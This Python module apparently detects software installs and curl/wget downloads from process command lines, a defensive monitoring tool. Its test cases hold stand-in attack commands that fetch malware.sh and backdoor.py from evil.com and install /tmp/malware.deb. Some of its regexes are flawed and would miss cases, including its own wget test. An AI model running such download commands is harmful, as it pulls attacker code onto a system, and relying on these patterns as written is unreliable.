#!/usr/bin/env python3
"""
Software Installation Detector
Detects new software being installed via package managers at runtime
"""

import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class PackageInstallation:
    package_manager: str
    operation: str  # install, remove, upgrade
    packages: List[str]
    version: Optional[str] = None


class SoftwareDetector:
    """
    Detects software installation from package manager executions
    """

    # Package manager patterns
    PACKAGE_MANAGERS = {
        'apt': {
            'install': r'(?:install|upgrade|dist-upgrade)\s+([\w\-\.]+)',
            'remove': r'(?:remove|purge)\s+([\w\-\.]+)',
        },
        'apt-get': {
            'install': r'(?:install|upgrade|dist-upgrade)\s+([\w\-\.]+)',
            'remove': r'(?:remove|purge|autoremove)\s+([\w\-\.]+)',
        },
        'dpkg': {
            'install': r'(?:-i|--install)\s+([^\s]+\.deb)',
            'remove': r'(?:-r|--remove)\s+([\w\-\.]+)',
        },
        'yum': {
            'install': r'(?:install|update|upgrade)\s+([\w\-\.]+)',
            'remove': r'(?:remove|erase)\s+([\w\-\.]+)',
        },
        'dnf': {
            'install': r'(?:install|update|upgrade)\s+([\w\-\.]+)',
            'remove': r'(?:remove|erase)\s+([\w\-\.]+)',
        },
        'rpm': {
            'install': r'(?:-i|--install)\s+([^\s]+\.rpm)',
            'remove': r'(?:-e|--erase)\s+([\w\-\.]+)',
        },
        'apk': {
            'install': r'add\s+([\w\-\.]+)',
            'remove': r'del\s+([\w\-\.]+)',
        },
        'pip': {
            'install': r'install\s+([\w\-\.]+)',
            'remove': r'uninstall\s+([\w\-\.]+)',
        },
        'pip3': {
            'install': r'install\s+([\w\-\.]+)',
            'remove': r'uninstall\s+([\w\-\.]+)',
        },
        'npm': {
            'install': r'(?:install|i)\s+([\w\-@\/\.]+)',
            'remove': r'(?:uninstall|remove|rm)\s+([\w\-@\/\.]+)',
        },
        'yarn': {
            'install': r'add\s+([\w\-@\/\.]+)',
            'remove': r'remove\s+([\w\-@\/\.]+)',
        },
        'gem': {
            'install': r'install\s+([\w\-\.]+)',
            'remove': r'uninstall\s+([\w\-\.]+)',
        },
        'go': {
            'install': r'(?:get|install)\s+([\w\-\.\/]+)',
        },
        'cargo': {
            'install': r'install\s+([\w\-\.]+)',
        },
    }

    # Download tools that might fetch malicious software
    DOWNLOAD_TOOLS = {
        'curl': r'curl.*?(?:-o|--output)\s+([^\s]+)',
        'wget': r'wget.*?(?:-O|--output-document)\s+([^\s]+)',
    }

    def __init__(self):
        pass

    def detect_installation(self, executable: str, arguments: str) -> Optional[PackageInstallation]:
        """
        Detect if execution is a software installation

        Args:
            executable: Full path to executable (e.g., /usr/bin/apt)
            arguments: Command line arguments

        Returns:
            PackageInstallation if detected, None otherwise
        """
        # Extract package manager name from executable path
        pkg_mgr = self._extract_package_manager(executable)

        if not pkg_mgr or pkg_mgr not in self.PACKAGE_MANAGERS:
            return None

        # Parse the operation and packages
        patterns = self.PACKAGE_MANAGERS[pkg_mgr]

        for operation, pattern in patterns.items():
            packages = self._extract_packages(arguments, pattern)

            if packages:
                return PackageInstallation(
                    package_manager=pkg_mgr,
                    operation=operation,
                    packages=packages
                )

        return None

    def detect_download(self, executable: str, arguments: str) -> Optional[Tuple[str, str]]:
        """
        Detect if execution is downloading a file

        Returns:
            (tool, filename) if detected, None otherwise
        """
        tool_name = self._extract_tool_name(executable)

        if tool_name not in self.DOWNLOAD_TOOLS:
            return None

        pattern = self.DOWNLOAD_TOOLS[tool_name]
        match = re.search(pattern, arguments)

        if match:
            filename = match.group(1)
            return (tool_name, filename)

        return None

    def _extract_package_manager(self, executable: str) -> Optional[str]:
        """Extract package manager name from executable path"""
        # Get basename
        name = executable.split('/')[-1]

        # Remove version suffix (e.g., pip3.9 -> pip3)
        name = re.sub(r'\d+\.\d+$', '', name)

        return name if name in self.PACKAGE_MANAGERS else None

    def _extract_tool_name(self, executable: str) -> str:
        """Extract tool name from executable path"""
        return executable.split('/')[-1]

    def _extract_packages(self, arguments: str, pattern: str) -> List[str]:
        """Extract package names from arguments using regex pattern"""
        matches = re.findall(pattern, arguments)

        # Deduplicate and filter out flags
        packages = []
        for match in matches:
            # Skip if it looks like a flag
            if match.startswith('-'):
                continue

            # Clean up package name
            pkg = match.strip()

            # Handle npm scoped packages (@scope/package)
            # Handle file paths for .deb, .rpm
            if pkg and pkg not in packages:
                packages.append(pkg)

        return packages

    def is_package_manager(self, executable: str) -> bool:
        """Check if executable is a known package manager"""
        pkg_mgr = self._extract_package_manager(executable)
        return pkg_mgr is not None

    def is_download_tool(self, executable: str) -> bool:
        """Check if executable is a known download tool"""
        tool_name = self._extract_tool_name(executable)
        return tool_name in self.DOWNLOAD_TOOLS


# Example usage
if __name__ == '__main__':
    detector = SoftwareDetector()

    # Test cases
    test_cases = [
        ('/usr/bin/apt', 'install nginx curl'),
        ('/usr/bin/apt-get', 'upgrade -y'),
        ('/usr/bin/yum', 'install httpd'),
        ('/usr/bin/pip3', 'install requests boto3'),
        ('/usr/bin/npm', 'install @angular/core express'),
        ('/usr/local/bin/gem', 'install rails'),
        ('/usr/bin/curl', '-o malware.sh https://evil.com/malware.sh'),
        ('/usr/bin/wget', '--output-document=backdoor.py https://evil.com/backdoor.py'),
        ('/bin/dpkg', '-i /tmp/malware.deb'),
    ]

    print("Software Installation Detection Tests:\n")

    for executable, arguments in test_cases:
        # Check installation
        installation = detector.detect_installation(executable, arguments)
        if installation:
            print(f"[INSTALL] {executable} {arguments}")
            print(f"  Package Manager: {installation.package_manager}")
            print(f"  Operation: {installation.operation}")
            print(f"  Packages: {', '.join(installation.packages)}")
            print()

        # Check downloads
        download = detector.detect_download(executable, arguments)
        if download:
            tool, filename = download
            print(f"[DOWNLOAD] {executable} {arguments}")
            print(f"  Download Tool: {tool}")
            print(f"  File: {filename}")
            print()
